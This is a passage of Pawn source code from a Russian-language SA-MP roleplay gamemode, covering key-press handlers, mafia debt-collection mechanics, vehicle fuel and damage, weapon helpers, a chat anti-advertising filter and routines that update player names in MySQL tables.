		ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,7000,1);
	}
	if (newkeys == KEY_CROUCH)
	{
		if(GetPlayerState(playerid) != 2) return true;
		if(PlayerToPoint(8.0,playerid,-2074.50000000,-94.90000153,35.00000000))
		{
			CallLocalFunction("OnPlayerCommandText", "is", playerid, "/instopen");
		}
		else if(PlayerToPoint(10.0,playerid,2203.7639160156,-2252.0620117188,13.5))
		{
			CallLocalFunction("OnPlayerCommandText", "is", playerid, "/prodopen");
		}
	}
	if(newkeys == KEY_CROUCH)
	{
		if(PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pLeader] == 19 || proverkaforma[playerid] == 1)
		{
			if(IsPlayerConnected(playerid))
			{
				if(PlayerToPoint(8.0,playerid,290.2172,1822.6295,17.6406))
				{
					if (GetPlayerState(playerid) == 2)
					{
						if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 416 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 433)
						{
							SCM(playerid,COLOR_GREY, "Попробуйте в объезд!");
							return true;
						}
						new tmpcar = GetPlayerVehicleID(playerid);
						SetVehiclePos(tmpcar, 282.0428, 1822.5503, 17.6406);
						PlayerInfo[ playerid ][ pPos_x ] = 282.0428;
						PlayerInfo[ playerid ][ pPos_y ] = 1822.5503;
						PlayerInfo[ playerid ][ pPos_z ] = 17.6406;
						SetPVarInt(playerid, "AntiBreik", 2);
						TelePos[playerid][0] = 0.0;
						TelePos[playerid][1] = 0.0;
					}
				}
				else if(PlayerToPoint(8.0,playerid,282.0428,1822.5503,17.6406))
				{
					if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 416 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 432 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 433)
					{
						SCM(playerid,COLOR_GREY, "Попробуйте в объезд!");
						return true;
					}
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 290.2172,1822.6295,17.6406);
					PlayerInfo[ playerid ][ pPos_x ] = 290.2172;
					PlayerInfo[ playerid ][ pPos_y ] = 1822.6295;
					PlayerInfo[ playerid ][ pPos_z ] = 17.6406;
					SetPVarInt(playerid, "AntiBreik", 2);
					TelePos[playerid][0] = 0.0;
					TelePos[playerid][1] = 0.0;
					return true;
				}
			}
		}
	}
	if(newkeys & KEY_HANDBRAKE && newkeys & KEY_SECONDARY_ATTACK )
	{
		if(IsAMafia(playerid))
		{
			new giveplayerid;
			if(GetPlayerState(playerid)!=PLAYER_STATE_ONFOOT) return true;
			if(GetPlayerState(giveplayerid)!=PLAYER_STATE_ONFOOT) return true;
			giveplayerid= GetClosestforeach(playerid);
			new Float:health;
			GetPlayerHealth(giveplayerid,health);
			if (ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(PlayerInfo[playerid][pMember] == 6)
				{
					if(KrishaOffer[giveplayerid] < 999)
					{
						if(health <= 25 && PlayerInfo[giveplayerid][pJob] != 0)
						{
							SCM(playerid,COLOR_GREEN, " Вы избили должника до 25 хп, крыша была автоматически установлена!");
							PlayerInfo[giveplayerid][pKrisha] = 6;
							KrishaOffer[giveplayerid] = 999;
							return true;
						}
					}
				}
			}
			if (ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(PlayerInfo[playerid][pMember] == 5)
				{
					if(KrishaOffer[giveplayerid] < 999)
					{
						if(health <= 25 && PlayerInfo[giveplayerid][pJob] != 0)
						{
							SCM(playerid,COLOR_GREEN, " Вы избили должника до 25 хп, крыша была автоматически установлена!");
							PlayerInfo[giveplayerid][pKrisha] = 5;
							KrishaOffer[giveplayerid] = 999;
							return true;
						}
					}
				}
			}
			if(PlayerInfo[playerid][pMember] == 14)
			{
				if(KrishaOffer[giveplayerid] < 999)
				{
					if(health <= 25 && PlayerInfo[giveplayerid][pJob] != 0)
					{
						SCM(playerid,COLOR_GREEN, " Вы избили должника до 25 хп, крыша была автоматически установлена!");
						PlayerInfo[giveplayerid][pKrisha] = 14;
						KrishaOffer[giveplayerid] = 999;
						return true;
					}
				}
			}
		}
	}
	if(newkeys & KEY_HANDBRAKE  && newkeys & KEY_SECONDARY_ATTACK )
	{
		if(IsAMafia(playerid))
		{
			new giveplayerid;
			if(GetPlayerState(playerid)!=PLAYER_STATE_ONFOOT) return true;
			if(GetPlayerState(giveplayerid)!=PLAYER_STATE_ONFOOT) return true;
			giveplayerid= GetClosestforeach(playerid);
			new Float:health;
			GetPlayerHealth(giveplayerid,health);
			if (ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(PlayerInfo[giveplayerid][pKrisha] ==6)
				{
					if(health <= 25 && PlayerInfo[giveplayerid][pUseKrisha] !=0)
					{
						if(PlayerInfo[giveplayerid][pDolg] < 50) return SCM(playerid,COLOR_GREY, " Он/Она еще ни чего не заработал(а)!");
						SCM(playerid,COLOR_GREEN, " Вы избили должника до 25 хп, долг был выбит");
						MafiaBank[0][nYakuza]+=PlayerInfo[giveplayerid][pDolg];
						PlayerInfo[giveplayerid][pDolg] = 0;
						PlayerInfo[giveplayerid][pUseKrisha] =0;
						return true;
					}
				}
			}
			if (ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(PlayerInfo[giveplayerid][pKrisha] ==5)
				{
					if(health <= 25 && PlayerInfo[giveplayerid][pUseKrisha] !=0)
					{
						if(PlayerInfo[giveplayerid][pDolg] < 50) return SCM(playerid,COLOR_GREY, " Он/Она еще ни чего не заработал(а)!");
						SCM(playerid,COLOR_GREEN, " Вы избили должника до 25 хп, долг был выбит");
						MafiaBank[0][nLcn]+=PlayerInfo[giveplayerid][pDolg];
						PlayerInfo[giveplayerid][pDolg] = 0;
						PlayerInfo[giveplayerid][pUseKrisha] =0;
						return true;
					}
				}
			}
			if (ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(PlayerInfo[giveplayerid][pKrisha] ==14)
				{
					if(health <= 25 && PlayerInfo[giveplayerid][pUseKrisha] !=0)
					{
						if(PlayerInfo[giveplayerid][pDolg] < 50) return SCM(playerid,COLOR_GREY, " Он/Она еще ни чего не заработал(а)!");
						SCM(playerid,COLOR_GREEN, " Вы избили должника до 25 хп, долг был выбит");
						MafiaBank[0][nRm]+=PlayerInfo[giveplayerid][pDolg];
						PlayerInfo[giveplayerid][pDolg] = 0;
						PlayerInfo[giveplayerid][pUseKrisha] =0;
						return true;
					}
				}
			}
		}
	}
	if(newkeys & KEY_SPRINT && newkeys & KEY_JUMP && GetPlayerState(playerid) != 2) ClearAnimations(playerid), ApplyAnimation(playerid,"PED","getup_front",4.0,0,0,0,0,0);
	if((newkeys & KEY_SUBMISSION && !(oldkeys & KEY_SUBMISSION)) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
	    if(IsPlayerInGarage(playerid)) return MovePlayerFromGarage(playerid); // Телепорт игрока из гараж вместе с машиной
		CallLocalFunction("OnPlayerCommandText", "is", playerid, "/en");
	}
	if((newkeys & 1 && !(oldkeys & 1)) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) CallLocalFunction("OnPlayerCommandText", "is", playerid, "/slimit");
	if(newkeys == 16)
	{
		if(!IsPlayerInAnyVehicle(playerid))
		{
			CallLocalFunction("OnPlayerCommandText", "is", playerid, "/atm");
		}
	}
	if(newkeys == 16)
	{
		if(IsAFoods(playerid))
		{
			ClearAnimations(playerid, 1);
			SCM(playerid,0x9f0000aa, " Автомат сломан");
			return true;
		}
	}
	return true;
}
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	if(PlayerInfo[playerid][pMember] == 11)
	{
		if(!ProxDetectorS(8.0, playerid, clickedplayerid)) return SCM(playerid,COLOR_GREY,"Игрок должен находиться рядом с вами");
		if(!GetPVarInt(playerid,"Fraction_Duty")) return SCM(playerid,COLOR_GRAD1, "Вам нужно начать рабочий день в автошколе");
		new listitems[] = " [0] Водительские права\n [1] Лицензия на полёты\n [2] Лицензия на рыболовлю\n [3] Лицензия на вождение водного транспорта\n [4] Лицензия на оружие\n [5] Лицензия на бизнес\n [6] Начать урок\n [7] Завершить урок";
		ShowPlayerDialogEx(playerid, 7777, DIALOG_STYLE_LIST, "Выдача лицензий", listitems, "Выбрать", "Отмена");
		ChosenPlayer[playerid] = clickedplayerid;
		SetPVarInt(ChosenPlayer[playerid],"PlayerSell",playerid);
	}
	return false;
}
publics: GiveMoney(playerid, amount)
{
	PlayerInfo[playerid][pCash] += amount;
	GivePlayerMoney(playerid, amount);
}
publics: ResetMoney(playerid)
{
	PlayerInfo[playerid][pCash] = 0;
	ResetPlayerMoney(playerid);
}
stock IsAnAmbulance(carid)
{
	if(carid >= medicssf[0] && carid <= medicssf[7] || carid >= medicssf1[0] || carid == medmav || carid >= medicsls[0] && carid <= medicsls[9] || carid >= medicsls1[0] && carid <= medicsls1[5] || carid >= medicslv[0] && carid <= medicslv[7] || carid >= medicsfc[0] && carid <= medicsfc[7]) return true;
	return false;
}
stock CarLic(carid)
{
	switch (GetVehicleModel(carid))
	{
	case 400..416,418..424,426..429,431..445,449,451,455,456,458,459,461: return true;
	case 463,466..468,470,471,474,475,477..480,482,483,485,486,489..492,494..496,498..508: return true;
	case 514..518,521..531,533..537,539..547,549..551,554..562,564..568,572..576,578..583,585..589,596..605,609: return true;
	}
	return false;
}
publics: PlayerToKvadrat(playerid,Float:min_x,Float:min_y,Float:max_x,Float:max_y)
{
	new Float:xxp,Float:yyp,Float:zzp;
	GetPlayerPos(playerid, xxp, yyp, zzp);
	if((xxp <= max_x && xxp >= min_x) && (yyp <= max_y && yyp >= min_y)) return true;
	return false;
}
stock GetGangZoneColor(gangzonex)
{
	new zx;
	switch(GZInfo[gangzonex][gFrakVlad])
	{
	case 12: zx = 0xd200ff99;
	case 13: zx = 0xcfbe0899;
	case 15: zx = 0x06b50699;
	case 17: zx = 0x03c3b899;
	case 18: zx = 0x007fffAA;
	default: zx = 0xFEFEFEAA;
	}
	return zx;
}
stock GetGZColorF(fnumber)
{
	new zx;
	switch(fnumber)
	{
	case 12: zx = 0xFF0000AA;
	case 13: zx = 0xFF0000AA;
	case 15: zx = 0xFF0000AA;
	case 17: zx = 0xFF0000AA;
	case 18: zx = 0xFF0000AA;
	}
	return zx;
}
stock GetNearestVehicle(playerid)
{
	for(new i = GetVehiclePoolSize(); i >= 0; i--)
	{
		if(GetVehicleModel(i))
		{
			new Float:X,Float:Y,Float:Z;
			GetVehiclePos(i,X,Y,Z);
			if(PlayerToPoint(4.0, playerid, X, Y, Z))return i;
		}
	}
	return -1;
}
stock IsInAllowedF(fnumbers)
{
	for(new i =0;i<sizeof(allowedfactions);i++) if(fnumbers == allowedfactions[i]) return true;
	return false;
}
stock GetGangName(fnumbwer)
{
	new str[30];
	switch(fnumbwer)
	{
	case 12: format(str,sizeof(str), "BALLAS");
	case 13: format(str,sizeof(str), "VAGOS");
	case 15: format(str,sizeof(str), "GROVE");
	case 17: format(str,sizeof(str), "AZTECAS");
	case 18: format(str,sizeof(str), "RIFA");
	}
	return str;
}
stock GetMafiaName(fnumbwer)
{
	new str[25];
	switch(fnumbwer)
	{
	case 5: format(str,sizeof(str), "LCN");
	case 6: format(str,sizeof(str), "Yakuza");
	case 14: format(str,sizeof(str), "Russian Mafia");
	}
	return str;
}
CMD:scm(playerid, params[])
{
 	if(PlayerInfo[playerid][pAdmin] < 9) return true;
 	new strs[256], color;
 	if(sscanf(params, "dxs[256]", params[0], color, strs)) return SCM(playerid, -1, " Введите: /SCM [playerid] [color] [text]");
 	SCM(params[0], color, strs);
	return true;
}
CMD:send(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 10) return true;
	new command[128];
	if(sscanf(params, "us[128]", params[0], command)) return SCM(playerid, -1, " Введите: /send [playerid] [command]");
	if(strfind(command, "/") != -1)
	CallLocalFunction("OnPlayerCommandText", "is", params[0], command);
	else
	CallLocalFunction("OnPlayerText", "is", params[0], command);
	return true;
}
public OnVehicleDeath(vehicleid, killerid)
{
	if(SERVERTEST) SendMes(killerid,COLOR_BLUE,"VEHICLEDEATH: VEHICLEID - %i, KILLERID - %i",vehicleid,killerid);
	if(killerid != INVALID_PLAYER_ID)
	{
		new Float:carhp = GetVehicleHealth(vehicleid, carhp);
		if(carhp < 300) return true;
		return 1;
	}
	SetPVarInt(killerid,"vehicledeath", GetTickCount());
	SetVehicleParamsEx(vehicleid,false,false,false,false,false,false,false);
	car_ex[vehicleid] = true;
	return true;
}
public OnVehicleSpawn(vehicleid)
{
	if(SERVERCARID[vehicleid] == false)
	{
		DestroyVehicle(vehicleid);
	}
	car_ex[vehicleid] = true;
	GetVehiclePos(vehicleid,car_coord[vehicleid][0],car_coord[vehicleid][1],car_coord[vehicleid][2]);
	GetVehicleZAngle(vehicleid,car_coord[vehicleid][3]);
	SetVehicleParamsEx(vehicleid,false,false,false,false,false,false,false);
	CarHealth[vehicleid] = float(1000);
	enginebrokened[vehicleid] = 0;
	if(car_pickup[vehicleid] > 0) DestroyDynamic3DTextLabel(car_text[vehicleid]), DestroyDynamicPickup(car_pickup[vehicleid]), car_pickup[vehicleid] = 0;
	if(Farmcar_pickup[vehicleid] > 0) Delete3DTextLabel(Farmcar_text[vehicleid]), DestroyDynamicPickup(Farmcar_pickup[vehicleid]), Farmcar_pickup[vehicleid] = 0;
	if(Farmcar_pickup[vehicleid] > 0) Delete3DTextLabel(Farmcar_text[vehicleid]), DestroyDynamicPickup(Farmcar_pickup[vehicleid]), Farmcar_pickup[vehicleid] = 0;
	foreach(i)
	{
		if(GetPVarInt(i,"took_faggio") == vehicleid && GetPVarInt(i,"took_faggio") > 0)
		{
			DestroyVehicle(vehicleid);
			DeletePVar(i,"took_faggio");
		}
	}
	foreach(i)
	{
		if(vehicleid == house_car[i]) Fuell[house_car[i]] = CarInfo[i][carFuel][GetPVarInt(i, "chosencar")],SetVehicleParamsEx(vehicleid,false,false,false,true,false,false,false), LoadTuning(i,house_car[i],GetPVarInt(i, "chosencar"));
	}
	for(new i = 0; i < 10; i++) if(vehicleid == taxi5lvlcar[i]) police[taxi5lvlcar[i]] = CreateObject(19308,0,0,0,0,0,0,100.0), AttachObjectToVehicle(police[taxi5lvlcar[i]], taxi5lvlcar[i], 0.000000, -0.400000, 0.854999, 0.000000, 0.000000, 0.0);
	for(new i = 0; i < 11; i++) if(vehicleid == taxi10lvlcar[i]) police[taxi10lvlcar[i]] = CreateObject(19308,0,0,0,0,0,0,100.0), AttachObjectToVehicle(police[taxi10lvlcar[i]], taxi10lvlcar[i], -0.014999, -0.140000, 0.919999, -1.005000, 0.000000, 0.0);
	foreach(i)
	{
	    if(vehicleid == house_car[i] && PlayerInfo[i][pKvartiraKey] != 0)
	    {
	        DestroyVehicle(house_car[i]);
	        house_car[i] = -1;
	    }
	}
	return true;
}
publics: Random(min, max)
{
	new a = random(max - min) + min;
	return a;
}
publics: PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;
	GetPlayerPos(playerid, oldposx, oldposy, oldposz);
	tempposx = (oldposx -x);
	tempposy = (oldposy -y);
	tempposz = (oldposz -z);
	if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))) return true;
	return false;
}
stock GetWeaponNameEx(id, name[], len) return format(name,len, "%s", GunNames[id]);
stock IsAPistol(gunid)
{
	if(gunid >= 22 && gunid <=24) return true;
	return false;
}
stock IsAMelee(gunid)
{
	if(gunid >= 2 && gunid <= 9 ) return true;
	return false;
}
stock IsAGirlsStuff(gunid)
{
	if(gunid >= 10 && gunid <= 15 || gunid == 46) return true;
	return false;
}
stock IsAGrenade(gunid)
{
	if((gunid >= 16 && gunid <= 18) || gunid == 39) return true;
	return false;
}
stock IsAShotgun(gunid)
{
	if(gunid >= 25 && gunid <= 27) return true;
	return false;
}
stock IsAMachineGun(gunid)
{
	if(gunid == 28 || gunid == 29 || gunid == 32) return true;
	return false;
}
stock IsAnAssault(gunid)
{
	if(gunid == 30 || gunid == 31) return true;
	return false;
}
stock IsARifle(gunid)
{
	if(gunid == 33 || gunid == 34) return true;
	return false;
}
stock IsAHeavyAssault(gunid)
{
	if(gunid >= 35 && gunid <= 37 ) return true;
	return false;
}
stock IsAStuff1(gunid)
{
	if(gunid >= 41 && gunid <= 43 ) return true;
	return false;
}
stock GetSRVMoney(playerid) return PlayerInfo[playerid][pCash];
publics: DelGun(playerid)
{
	SetPVarInt(playerid, "GunCheckTime",5);
	for(new i = 0; i < 46; i++) Weapons[playerid][i] = 0;
	for(new i = 0; i < 10; i++) PlayerInfo[playerid][pWeapon][i] = 0, PlayerInfo[playerid][pAmmo] = 0;
	ResetPlayerWeaponsEx(playerid);
	return true;
}
stock GiveArmour(playerid, Float:armour) return Armour[playerid] = armour, SetPlayerArmourAC(playerid,armour);
stock RemovePlayerFromVehicleAC(playerid)
{
	car_ex[GetPlayerVehicleID(playerid)] = true;
	GetVehiclePos(GetPlayerVehicleID(playerid),car_coord[GetPlayerVehicleID(playerid)][0],car_coord[GetPlayerVehicleID(playerid)][1],car_coord[GetPlayerVehicleID(playerid)][2]);
	GetVehicleZAngle(GetPlayerVehicleID(playerid),car_coord[GetPlayerVehicleID(playerid)][3]);
	RemovePlayerFromVehicle(playerid);
	SetTimerEx("AntiRemovePlayerFromVehicle", 3800, 0, "d",playerid);
	return true;
}
publics: AntiRemovePlayerFromVehicle(playerid)
{
}
publics: GetMoney()
{
	foreach(i)
	{
		if(PlayerInfo[i][pCash] != GetPlayerMoney(i)) ResetPlayerMoney(i), GivePlayerMoney(i, PlayerInfo[i][pCash]);
	}
	return ;
}
stock UnLockCar(playerid,carid)
{
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(!IsAPlane(carid) && !IsABoat(carid) && !IsABike(carid) && AutoSaloon[playerid] != true)
		{
			PlayerTextDrawColor(playerid,StatusShow[playerid], 0x20B220AA);
			PlayerTextDrawSetString(playerid,StatusShow[playerid],"Unlock");
			PlayerTextDrawShow(playerid,StatusShow[playerid]);
		}
	}
	GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
	return SetVehicleParamsEx(carid,engine,lights,alarm,false,bonnet,boot,objective);
}
stock SpeedVehicle(playerid)
{
	new Float:ST[4];
	if(IsPlayerInAnyVehicle(playerid)) GetVehicleVelocity(GetPlayerVehicleID(playerid),ST[0],ST[1],ST[2]);
	else return 0;
	//GetPlayerVelocity(playerid,ST[0],ST[1],ST[2]);
	ST[3] = floatsqroot(floatpower(floatabs(ST[0]), 2.0) + floatpower(floatabs(ST[1]), 2.0) + floatpower(floatabs(ST[2]), 2.0)) * 100.3;
	return floatround(ST[3]);
}
publics: UpdateSpeedometr()
{
	foreach(playerid)
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) continue;
		if(IsAPlane(GetPlayerVehicleID(playerid)) || IsABoat(GetPlayerVehicleID(playerid)) || IsABike(GetPlayerVehicleID(playerid))) continue;
		GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		UnSurfCar(vehicleid);
		format(str1,5,"%i",SpeedVehicle(playerid));
		if(PlayerInfo[playerid][pDrivingSkill] > 0 && !IsANoLimiter(vehicleid))
		{
			switch(PlayerInfo[playerid][pDrivingSkill])
			{
			case 1..300: if(SpeedVehicle(playerid) > 50) format(str1, 5, "50");
			case 301..600: if(SpeedVehicle(playerid) > 45) format(str1, 5, "45");
			case 601..900: if(SpeedVehicle(playerid) > 40) format(str1, 5, "40");
			case 901..1200: if(SpeedVehicle(playerid) > 35) format(str1, 5, "35");
			}
		}
		PlayerTextDrawSetString(playerid,SpeedShow[playerid],str1);
		if(Fuell[vehicleid] <= 0 && engine)
		{
			Fuell[vehicleid] = 0;
			GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(vehicleid,false,false,alarm,doors,bonnet,boot,objective);
			GameTextForPlayer(playerid,"~r~FUEL HAS ENDED", 5000, 3);
			SCM(playerid, COLOR_GREEN, " {00A86B}Используйте телефон {FFFFFF}(( /call )) {00A86B}чтобы вызвать механика / таксиста");
			SCM(playerid, COLOR_GREEN, " {00A86B}Если у вас есть канистра с бензином, введите {FFFFFF}(( /fillcar ))");
		}
		if(Fuell[vehicleid] <= 45) format(str2, sizeof(str2), "~r~%.0f", Fuell[vehicleid]);
		else if(Fuell[vehicleid] <= 100) format(str2, sizeof(str2), "~y~%.0f", Fuell[vehicleid]);
		else format(str2, sizeof(str2), "~g~%.0f", Fuell[vehicleid]);
		PlayerTextDrawSetString(playerid,FuelShow[playerid],str2);
		if(vehicleid == house_car[playerid]) CarInfo[playerid][carFuel][GetPVarInt(playerid, "chosencar")] = Fuell[vehicleid];
		if(!engine && SpeedVehicle(playerid) > 20 && GetPVarInt(playerid,"not_engine") < gettime() && GetPVarInt(playerid, "AFK_Time") < 2)
		{
			SetPVarInt(playerid,"not_engine", gettime() + 5);
			SetPVarInt(playerid,"not_engine_", SpeedVehicle(playerid));
		}
	}
	return true;
}
new WebSites[][] ={".ws", ".ru", ".tk", ".com", "www.", ".org", ".net", ".cc", ".рф", ".by", ".biz", ".su", ".info"};
stock CheckString(str[])
{
	for(new i = 0;i<sizeof(WebSites);i++) if(strfind(str,WebSites[i],true) != -1) return true;
	return false;
}
new delimiters[]={'.', ' ', ',', '*', '/', ';', '\\', '|'};
stock IsIP(const str[])
{
	for(new cIP[4]; cIP[0] != strlen(str)+1; cIP[0]++)
	{
		switch(str[cIP[0]])
		{
		case '.', ' ', ':', ',', '*', '/', ';', '\\', '|' : continue;
		case '0' .. '9': cIP[1]++;
		}
		if(cIP[1] ==1){ cIP[2] = cIP[0];}
		if(cIP[1] >= 8)
		{
			new strx[16];
			new l[4][4];
			cIP[3] = cIP[0]+8;
			strmid(strx,str,cIP[2],cIP[3],16);
			for(new i = strlen(strx); i > 8; i--)
			{
				switch(strx[i])
				{
				case '0' .. '9','.', ' ', ':', ',', '*', '/', ';', '\\', '|': continue;
				default: strx[i] =0;
				}
			}
			for(new i = 0 ; i < sizeof(delimiters); i++)
			{
				split(strx,l,delimiters[i]);
				if(strlen(l[0]) == 1 ||strlen(l[1]) == 1 ||strlen(l[2]) == 1 ||strlen(l[3]) == 1)
				{
					continue;
				}
				if(strlen(l[0]) >3 ||strlen(l[1]) >3 ||strlen(l[2]) >3)
				{
					continue;
				}
				else
				{
					return true;
				}
			}
		}
	}
	return false;
}
public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
	new Float: carhp;
	GetVehicleHealth(vehicleid,carhp);
	if((vehicleid >= buscar[0] && vehicleid <= buscar[1]) || (vehicleid >= buscar[2] && vehicleid <= buscar[3]) || (vehicleid >= buscar[4] && vehicleid <= buscar[5]) || (vehicleid >= buscar[6] && vehicleid <= buscar[7])) SetPVarInt(playerid,"BusRepairMoney", (1000-floatround(carhp))*3);
	if(carhp > 0 && carhp < 300 && enginebrokened[vehicleid] == 0)
	{
		GameTextForPlayer(playerid,"~r~ENGINE HAS BROKENED", 5000, 3),enginebrokened[vehicleid] = 1, SetVehicleHealth(vehicleid, 300.0);
		GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(vehicleid,false,false,alarm,doors,bonnet,boot,objective);
	}
	if(GetPlayerVehicleID(playerid) == house_car[playerid])
	{
		if(CarInfo[playerid][carPercent][GetPVarInt(playerid, "chosencar")] <= 0)
		{
			return true;
		}
		if(carhp > 600 && carhp < 1000)
		{
			CarInfo[playerid][carPercent][GetPVarInt(playerid, "chosencar")] -= 1;
			return true;
		}
		else if(carhp > 400 && carhp < 600)
		{
			CarInfo[playerid][carPercent][GetPVarInt(playerid, "chosencar")] -= 2;
			return true;
		}
		mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_CARS"` SET percent = '%i' WHERE id = '%i' AND owner = '%s'", CarInfo[playerid][carPercent], playerid, PlayerInfo[playerid][pName]);
		mysql_function_query(DATABASE,QUERY,false,"","");
	}
	if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)) && PlayerInfo[playerid][pDgruz] > 1)
	{
		SetPVarInt(playerid, "GruzUron", GetPVarInt(playerid, "GruzUron")+1);
		if(GetPVarInt(playerid, "GruzUron") > 5)
		{
			if(PlayerInfo[playerid][pDgruz] == 0) PlayerInfo[playerid][pDgruz] = 1;
			PlayerInfo[playerid][pDgruz]--;
			SetPVarInt(playerid, "GruzUdar", 1);
			SCM(playerid, 0xFF6347AA, " Вы потеряли часть груза");
			DeletePVar(playerid, "GruzUron");
			return 1;
		}
	}
	new Float: trailhp;
	GetVehicleHealth(GetVehicleTrailer(GetPlayerVehicleID(playerid)), trailhp);
	if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)) && PlayerInfo[playerid][pDgruz] > 1)
	{
		if(trailhp < 300)
		{
			SCM(playerid, 0xFF6347AA, " Вы потеряли свой груз");
			peremennn[playerid] = 0;
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			DestroyVehicle(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
			DriverJob[playerid] = false;
			PlayerInfo[playerid][pDgruz] = 0;
			Gruz[playerid] = 0;
			bGruz[playerid] = 0;
		}
	}
	GetVehicleHealth(vehicleid, carhp);
	if(floatcmp(last_vehicle_health[playerid], carhp) == 1)
	{
		accept_car_damage[playerid] += (last_vehicle_health[playerid] - carhp);
		last_vehicle_health[playerid] = carhp;
		if(accept_car_damage[playerid] > 900)
		{
			if(PlayerInfo[playerid][pDrivingSkill] <= 1800 && !IsANoLimiter(GetPlayerVehicleID(playerid)))
			{
				switch(PlayerInfo[playerid][pDrivingSkill])
				{
				case 0..1: PlayerInfo[playerid][pDrivingSkill] = 300;
				case 2..299: PlayerInfo[playerid][pDrivingSkill] = 600;
				case 300..599: PlayerInfo[playerid][pDrivingSkill] = 900;
				case 900..1199: PlayerInfo[playerid][pDrivingSkill] = 1200;
				}
				switch(PlayerInfo[playerid][pDrivingSkill])
				{
				case 300, 600, 900, 1200:
					{
						SCM(playerid,COLOR_RED," Ваш навык вождения был понижен. Соблюдайте /pdd для его повышения!");
						PlayerTextDrawSetString(playerid,LimitShow[playerid],"~r~MAX");
						accept_car_damage[playerid] = 0;
					}
				}
				accept_car_damage[playerid] = 0.0;
			}
		}
	}
	else last_vehicle_health[playerid] = carhp;
	return 1;
}
publics: TeleportTimer(playerid)
{
	SetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
	SetPlayerInterior(playerid, TeleportDestNoFloat[playerid][0]);
	SetPlayerVirtualWorld(playerid, TeleportDestNoFloat[playerid][1]);
	return true;
}
stock ConnectedPlayers()
{
	new count;
	foreach(i)
	{
		count++;
	}
	return count;
}
publics: ChangeName(playerid,str[])
{
	mysql_format(DATABASE, QUERY, 256, "UPDATE `accounts` SET `Name`='%s' WHERE `Name` = '%s'",str,Name(playerid));
	mysql_function_query(DATABASE,QUERY,false,"","");
	mysql_format(DATABASE, QUERY, 256, "UPDATE `admin` SET `Name`='%s' WHERE `Name` = '%s'",str,Name(playerid));
	mysql_function_query(DATABASE,QUERY,false,"","");
	mysql_format(DATABASE, QUERY, 256, "UPDATE `cars` SET `owner`='%s' WHERE `owner` = '%s'",str,Name(playerid));
	mysql_function_query(DATABASE,QUERY,false,"","");
	for(new i = 1; i <= TOTALCASINO; i++)
	{
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caManager],true) == 0) strmid(CasinoInfo[i][caManager], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caManager2],true) == 0) strmid(CasinoInfo[i][caManager2], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caManager3],true) == 0) strmid(CasinoInfo[i][caManager3], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caKrupie],true) == 0) strmid(CasinoInfo[i][caKrupie], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caKrupie2],true) == 0) strmid(CasinoInfo[i][caKrupie2], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caKrupie3],true) == 0) strmid(CasinoInfo[i][caKrupie3], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caKrupie4],true) == 0) strmid(CasinoInfo[i][caKrupie4], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caKrupie5],true) == 0) strmid(CasinoInfo[i][caKrupie5], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caKrupie6],true) == 0) strmid(CasinoInfo[i][caKrupie6], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
		if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[i][caKrupie7],true) == 0) strmid(CasinoInfo[i][caKrupie7], WantNickChange[playerid], 0, strlen(WantNickChange[playerid]), 50);
